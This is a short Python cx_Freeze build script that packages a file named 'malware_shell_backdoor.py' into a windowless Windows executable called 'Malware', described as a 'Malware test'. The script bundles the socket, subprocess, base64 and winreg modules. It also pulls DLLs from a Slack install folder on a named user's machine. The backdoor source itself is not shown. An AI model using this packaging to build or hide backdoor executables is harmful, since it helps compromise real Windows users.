import sys, find_file
from cx_Freeze import setup, Executable

base = None
if sys.platform == 'win32' : base = 'Win32GUI'

path = 'C:\\Users\\noro-bro\\AppData\\Local\\slack\\app-2.4.1\\resources\\app.asar.unpacked\\node_modules\edge-atom-shell\\build\Release\\'
dllfiles = find_file.get_dll(path)

opts = { 'packages' : ['os'], 'include_files':dllfiles, 'includes' : [ 'sys', 'base64', 'os', 'socket', 'subprocess', 'winreg' ] }

setup(
    name = 'Malware' ,
    version = '1.0' ,
    description = 'Malware test' ,
    author = 'Brage' ,
    options = {'build_exe' : opts } ,
    executables = [ Executable( 'malware_shell_backdoor.py' , base = base ) ] )